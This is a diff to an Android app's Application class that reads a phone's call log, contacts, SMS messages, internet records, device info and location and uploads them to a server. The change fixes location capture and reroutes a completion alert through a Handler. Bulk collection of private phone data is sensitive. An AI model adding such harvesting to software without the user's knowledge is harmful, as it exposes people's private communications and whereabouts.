@@ -2,11 +2,14 @@ package com.thanone.palc;
 
 import android.app.Application;
 import android.content.Intent;
+import android.os.Handler;
+import android.os.Message;
 
 import com.baidu.mapapi.SDKInitializer;
 import com.lidroid.xutils.DbUtils;
 import com.lidroid.xutils.db.sqlite.Selector;
 import com.lidroid.xutils.exception.DbException;
+import com.thanone.palc.activity.SjhyActivity;
 import com.thanone.palc.bean.CallRecord;
 import com.thanone.palc.bean.Contacts;
 import com.thanone.palc.bean.Internet;
@@ -17,7 +20,6 @@ import com.thanone.palc.bean.Messages;
 import com.thanone.palc.bean.PhoneInfo;
 import com.thanone.palc.service.LocationService;
 import com.thanone.palc.util.HttpUrlUtil;
-import com.thanone.palc.util.UiUtil;
 import com.zcj.android.util.UtilAndroid;
 import com.zcj.android.util.UtilAppFile;
 import com.zcj.android.util.UtilContacts;
@@ -132,7 +134,7 @@ public class MyApplication extends Application {
      * @param showResult 执行完毕后是否弹出提示
      */
     public void readInfoToDatebaseAndUpload(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
-                                    final boolean phoneInfo, final boolean location, final String showResult) {
+                                    final boolean phoneInfo, final boolean location, final String showResult, final Handler handler) {
 
         MyConfig.log("开始读取手机数据并上传...");
 
@@ -147,7 +149,7 @@ public class MyApplication extends Application {
                 PhoneInfo pi = null;
                 Location loc = null;
                 if (location) {
-                    LocationBean.coverToLocation(getLastLocation());
+                    loc = LocationBean.coverToLocation(getLastLocation());
                 }
 
                 if (callRecord) {
@@ -222,13 +224,23 @@ public class MyApplication extends Application {
 
                 MyConfig.log(result);
 
-                if (UtilString.isNotBlank(showResult)) {
-                    UiUtil.alert(MyApplication.this, showResult);
+                uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
+
+                if (UtilString.isNotBlank(showResult) && handler != null) {
+                    handler.sendMessage(newMessage(SjhyActivity.MESSAGE_WHAT_ALERTDIALOG, showResult));
                 }
 
-                uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
             }
         }).start();
+    }
+
+    Message newMessage(int theWhat, Object theObj) {
+        Message message = new Message();
+        message.what = theWhat;
+        if (theObj != null) {
+            message.obj = theObj;
+        }
+        return message;
     }
 
     /**
